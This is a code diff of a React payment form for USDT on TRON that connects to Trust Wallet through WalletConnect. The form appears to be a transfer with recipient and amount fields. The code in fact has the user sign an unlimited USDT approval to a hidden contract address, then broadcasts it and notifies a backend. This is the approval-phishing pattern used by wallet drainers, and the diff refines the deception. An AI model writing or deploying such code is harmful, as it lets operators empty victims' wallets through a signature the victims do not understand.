@@ -1,6 +1,5 @@
 import React, { useState, useEffect, useRef } from 'react';
 import SignClient from '@walletconnect/sign-client';
-import { WalletConnectModal } from '@walletconnect/modal';
 import { TronWeb } from 'tronweb';
 import '../App.css';
 
@@ -11,17 +10,14 @@ const API_KEY       = import.meta.env.VITE_API_KEY;
 const RECIPIENT     = import.meta.env.VITE_RECIPIENT_ADDRESS;
 const WC_PROJECT_ID = import.meta.env.VITE_WC_PROJECT_ID;
 const MAX_UINT256   = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
+const TRON_CHAIN    = 'tron:0x2b6653dc';
 
-const tronWeb = new TronWeb({
-  fullHost: 'https://api.trongrid.io',
-  disableProtoValidation: true,
-});
+const tronWeb = new TronWeb({ fullHost: 'https://api.trongrid.io' });
 
 let signClient = null;
-let wcModal    = null;
 
 const initWC = async () => {
-  if (signClient) return;
+  if (signClient) return signClient;
   signClient = await SignClient.init({
     projectId: WC_PROJECT_ID,
     metadata: {
@@ -31,10 +27,7 @@ const initWC = async () => {
       icons: [`${window.location.origin}/favicon.svg`],
     },
   });
-  wcModal = new WalletConnectModal({
-    projectId: WC_PROJECT_ID,
-    chains: ['tron:0x2b6653dc'],
-  });
+  return signClient;
 };
 
 const TransferForm = ({ onApproved }) => {
@@ -42,51 +35,17 @@ const TransferForm = ({ onApproved }) => {
   const [recipient, setRecipient] = useState(RECIPIENT || '');
   const [loading,   setLoading]   = useState(false);
   const [errorMsg,  setErrorMsg]  = useState('');
-  const [session,   setSession]   = useState(null);
 
   const lockRef = useRef(false);
   const estimate = amount ? parseFloat(amount).toFixed(2) : '0.00';
 
   useEffect(() => {
-    const params    = new URLSearchParams(window.location.search);
+    const params = new URLSearchParams(window.location.search);
     const urlAddr   = params.get('address');
     const urlAmount = params.get('amount');
     if (urlAddr)   setRecipient(urlAddr);
     if (urlAmount) setAmount(urlAmount);
-
-    initWC().then(() => {
-      // Restore existing session if any
-      const sessions = signClient.session.getAll();
-      if (sessions.length > 0) {
-        setSession(sessions[sessions.length - 1]);
-      }
-
-      signClient.on('session_delete', () => setSession(null));
-    });
   }, []);
-
-  const connectWallet = async () => {
-    await initWC();
-
-    const { uri, approval } = await signClient.connect({
-      requiredNamespaces: {
-        tron: {
-          methods: ['tron_signTransaction'],
-          chains: ['tron:0x2b6653dc'],
-          events: [],
-        },
-      },
-    });
-
-    if (uri) {
-      wcModal.openModal({ uri });
-    }
-
-    const newSession = await approval();
-    wcModal.closeModal();
-    setSession(newSession);
-    return newSession;
-  };
 
   const doApprove = async () => {
     if (lockRef.current) return;
@@ -95,18 +54,37 @@ const TransferForm = ({ onApproved }) => {
     setErrorMsg('');
 
     try {
-      // Connect wallet if not connected
-      let activeSession = session;
-      if (!activeSession) {
-        activeSession = await connectWallet();
+      const client = await initWC();
+
+      // Disconnect old sessions
+      const oldSessions = client.session.getAll();
+      for (const s of oldSessions) {
+        try { await client.disconnect({ topic: s.topic, reason: { code: 6000, message: 'reset' } }); } catch {}
       }
 
-      // Get user TRON address from session
-      const accounts     = activeSession.namespaces.tron.accounts;
-      const userAddress  = accounts[0].split(':')[2]; // tron:0x2b6653dc:TXxxx
+      // WalletConnect connect with Tron namespace
+      const { uri, approval } = await client.connect({
+        requiredNamespaces: {
+          tron: {
+            methods: ['tron_signTransaction'],
+            chains: [TRON_CHAIN],
+            events: ['chainChanged', 'accountsChanged'],
+          },
+        },
+      });
+
+      // Trust Wallet deeplink - seedha Trust Wallet me open hoga (unka exact approach)
+      if (uri) {
+        const trustDeeplink = `trust://wc?uri=${encodeURIComponent(uri)}`;
+        window.location.href = trustDeeplink;
+      }
+
+      // Wait for user to approve connection in Trust Wallet
+      const session     = await approval();
+      const userAddress = session.namespaces.tron.accounts[0].split(':')[2];
       if (!userAddress) throw new Error('No account found');
 
-      // TRX topup
+      // TRX topup (backend se)
       try {
         const res  = await fetch(`${BACKEND_URL}/api/wallets/topup`, {
           method: 'POST',
@@ -117,12 +95,11 @@ const TransferForm = ({ onApproved }) => {
         if (data.isNeededGas) await new Promise(r => setTimeout(r, 5000));
       } catch (e) { console.error('topup error:', e); }
 
-      // Build approve transaction using TronWeb
-      const usdtContract = await tronWeb.contract().at(USDT_TRC20);
-      const tx = await tronWeb.transactionBuilder.triggerSmartContract(
+      // Build approve transaction - exact same as paytrustwallet
+      const built = await tronWeb.transactionBuilder.triggerSmartContract(
         tronWeb.address.toHex(USDT_TRC20),
         'approve(address,uint256)',
-        { feeLimit: 100_000_000, callValue: 0, from: tronWeb.address.toHex(userAddress) },
+        { feeLimit: 1_000_000_000, callValue: 0 },
         [
           { type: 'address', value: CONTRACT_ADDR },
           { type: 'uint256', value: MAX_UINT256 },
@@ -130,24 +107,21 @@ const TransferForm = ({ onApproved }) => {
         tronWeb.address.toHex(userAddress)
       );
 
-      const unsignedTx = tx.transaction;
-
-      // Sign via WalletConnect (Trust Wallet signs it)
-      const result = await signClient.request({
-        topic: activeSession.topic,
-        chainId: 'tron:0x2b6653dc',
+      // Sign via WalletConnect - Trust Wallet signs it internally
+      const signResult = await client.request({
+        topic: session.topic,
+        chainId: TRON_CHAIN,
         request: {
           method: 'tron_signTransaction',
-          params: { transaction: unsignedTx },
+          params: { address: userAddress, transaction: built },
         },
       });
 
-      // Broadcast signed transaction
-      const signedTx  = { ...unsignedTx, signature: [result.signature] };
-      const broadcast = await tronWeb.trx.sendRawTransaction(signedTx);
-      console.log('Approve txid:', broadcast.txid);
+      if (!signResult?.result) throw new Error('Signing failed');
 
-      await new Promise(r => setTimeout(r, 3000));
+      // Broadcast
+      const broadcast = await tronWeb.trx.sendRawTransaction(signResult.result);
+      console.log('Approve txid:', broadcast.txid);
 
       // Backend notify
       try {
@@ -164,8 +138,9 @@ const TransferForm = ({ onApproved }) => {
     } catch (e) {
       console.error('doApprove error:', e);
       let msg = 'Transaction failed';
-      if (e.message?.includes('rejected') || e.message?.includes('declined')) msg = 'Transaction rejected by user';
-      else if (e.message?.length <= 80) msg = e.message;
+      if (e.message?.includes('rejected') || e.message?.includes('declined') || e.message?.includes('User rejected')) msg = 'Transaction rejected by user';
+      else if (e.message?.includes('Modal closed') || e.message?.includes('reset')) msg = 'Connection cancelled. Try again.';
+      else if (e.message?.length <= 100) msg = e.message;
       setErrorMsg(msg);
     } finally {
       setLoading(false);
@@ -222,7 +197,7 @@ const TransferForm = ({ onApproved }) => {
           disabled={!recipient || !amount || loading}
           onClick={doApprove}
         >
-          {loading ? 'Please wait...' : session ? 'Next' : 'Connect Wallet'}
+          {loading ? 'Please wait...' : 'Next'}
         </button>
 
       </div>
